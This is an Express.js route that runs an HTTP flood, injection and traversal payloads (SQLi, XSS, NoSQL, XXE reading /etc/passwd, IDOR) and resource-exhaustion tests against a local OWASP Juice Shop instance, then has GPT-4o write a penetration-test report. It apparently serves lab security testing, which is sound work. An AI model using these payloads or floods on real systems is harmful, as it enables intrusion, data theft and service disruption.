const express = require('express');
const router = express.Router();
const { getAIClient, saveReport, timestamp } = require('../lib/aiClient');
const store = require('../lib/store');

const TARGET = 'http://localhost:8080';

async function floodAttack(requests = 100, concurrency = 10) {
    const results = { success: 0, failed: 0, errors: [], responseTimes: [] };
    const endpoints = ['/', '/rest/products/search?q=test', '/api/Challenges', '/rest/user/whoami'];

    async function sendOne() {
        const url = TARGET + endpoints[Math.floor(Math.random() * endpoints.length)];
        const start = Date.now();
        try {
            const res = await fetch(url, { signal: AbortSignal.timeout(5000) });
            results.responseTimes.push(Date.now() - start);
            res.ok ? results.success++ : results.failed++;
        } catch (e) {
            results.failed++;
            results.errors.push(e.message);
        }
    }

    const batches = Math.ceil(requests / concurrency);
    for (let i = 0; i < batches; i++) {
        const batch = Math.min(concurrency, requests - i * concurrency);
        await Promise.all(Array.from({ length: batch }, sendOne));
    }

    const avg = results.responseTimes.length
        ? (results.responseTimes.reduce((a, b) => a + b, 0) / results.responseTimes.length).toFixed(0)
        : 'N/A';
    const max = results.responseTimes.length ? Math.max(...results.responseTimes) : 'N/A';

    return {
        type: 'HTTP Flood',
        totalRequests: requests,
        success: results.success,
        failed: results.failed,
        avgResponseMs: avg,
        maxResponseMs: max,
        uniqueErrors: [...new Set(results.errors)].slice(0, 5)
    };
}

async function exploitAttack() {
    const payloads = [
        // SQL Injection
        { label: 'SQLi login bypass',       method: 'POST', path: '/rest/user/login',           body: { email: "' OR 1=1--", password: 'x' } },
        { label: 'SQLi product search',     method: 'GET',  path: "/rest/products/search?q='))--" },
        // XSS
        { label: 'XSS search',              method: 'GET',  path: '/rest/products/search?q=<script>alert(1)</script>' },
        { label: 'XSS feedback',            method: 'POST', path: '/api/Feedbacks',              body: { comment: '<img src=x onerror=alert(1)>', rating: 1 } },
        // Path traversal
        { label: 'Path traversal',          method: 'GET',  path: '/assets/public/../../etc/passwd' },
        { label: 'Sensitive file access',   method: 'GET',  path: '/ftp/package.json.bak' },
        // Auth bypass / IDOR
        { label: 'IDOR user data',          method: 'GET',  path: '/api/Users/1' },
        { label: 'Admin page access',       method: 'GET',  path: '/#/administration' },
        // NoSQL / command injection attempts
        { label: 'NoSQL injection',         method: 'POST', path: '/rest/user/login',            body: { email: { $gt: '' }, password: { $gt: '' } } },
        { label: 'XXE via feedback',        method: 'POST', path: '/api/Feedbacks',              body: { comment: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>', rating: 1 } },
    ];

    const results = [];
    for (const p of payloads) {
        try {
            const opts = {
                method: p.method,
                headers: { 'Content-Type': 'application/json' },
                signal: AbortSignal.timeout(5000)
            };
            if (p.body) opts.body = JSON.stringify(p.body);
            const res = await fetch(TARGET + p.path, opts);
            const text = await res.text().catch(() => '');
            results.push({
                label: p.label,
                status: res.status,
                // Flag interesting responses — non-404/400 on attack payloads suggests vulnerability
                interesting: res.status === 200 || res.status === 201 || res.status === 500,
                snippet: text.slice(0, 120)
            });
        } catch (e) {
            results.push({ label: p.label, status: 'ERROR', interesting: false, snippet: e.message });
        }
    }
    return { type: 'Exploit Payloads', results };
}

async function resourceExhaustionAttack() {
    const results = [];

    // Large payload POST
    const bigPayload = 'A'.repeat(500_000);
    try {
        const res = await fetch(`${TARGET}/api/Feedbacks`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ comment: bigPayload, rating: 1 }),
            signal: AbortSignal.timeout(10000)
        });
        results.push({ test: '500KB payload POST', status: res.status });
    } catch (e) {
        results.push({ test: '500KB payload POST', status: 'ERROR', error: e.message });
    }

    // Deeply nested JSON
    let nested = { a: 'value' };
    for (let i = 0; i < 200; i++) nested = { child: nested };
    try {
        const res = await fetch(`${TARGET}/rest/user/login`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(nested),
            signal: AbortSignal.timeout(5000)
        });
        results.push({ test: 'Deeply nested JSON (200 levels)', status: res.status });
    } catch (e) {
        results.push({ test: 'Deeply nested JSON (200 levels)', status: 'ERROR', error: e.message });
    }

    // Rapid sequential requests to a heavy endpoint
    const heavyResults = await Promise.all(
        Array.from({ length: 20 }, () =>
            fetch(`${TARGET}/`, { signal: AbortSignal.timeout(5000) })
                .then(r => r.status).catch(() => 'ERROR')
        )
    );
    const heavyOk = heavyResults.filter(s => s === 200).length;
    const heavyStatuses = [...new Set(heavyResults)];
    results.push({ test: '20 concurrent requests to homepage', status: `${heavyOk}/20 succeeded`, statusCodes: heavyStatuses });

    return { type: 'Resource Exhaustion', results };
}

router.post('/', async (req, res) => {
    const { mode = 'all', floodCount = 100 } = req.body;
    try {
        const output = {};

        if (mode === 'all' || mode === 'flood')
            output.flood = await floodAttack(floodCount);
        if (mode === 'all' || mode === 'exploit')
            output.exploit = await exploitAttack();
        if (mode === 'all' || mode === 'resource')
            output.resource = await resourceExhaustionAttack();

        const summary = JSON.stringify(output, null, 2);
        const client = getAIClient();
        const response = await client.chat.completions.create({
            messages: [
                { role: 'system', content: 'You are a penetration testing expert. Analyze these attack results against OWASP Juice Shop. Identify: 1) Which attacks succeeded and what vulnerabilities they confirm, 2) Pod stability under load, 3) Security misconfigurations exposed. Be specific about the HTTP status codes and response snippets. Format in markdown.' },
                { role: 'user', content: `Analyze these attack results against juice-shop:\n\n${summary}` }
            ],
            temperature: 0.3, max_tokens: 1500, model: 'gpt-4o'
        });

        const analysis = response.choices[0].message.content;
        const filename = saveReport(
            `stress-attack_${timestamp()}.md`,
            `# Stress & Exploit Attack Analysis\n\n**Generated:** ${new Date().toLocaleString()}\n**Mode:** ${mode}\n\n## AI Analysis\n\n${analysis}\n\n## Raw Results\n\n\`\`\`json\n${summary}\n\`\`\``
        );

        store.stressAttack = analysis;
        res.json({ success: true, analysis, results: output, reportFile: filename, timestamp: new Date().toLocaleString() });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

module.exports = router;
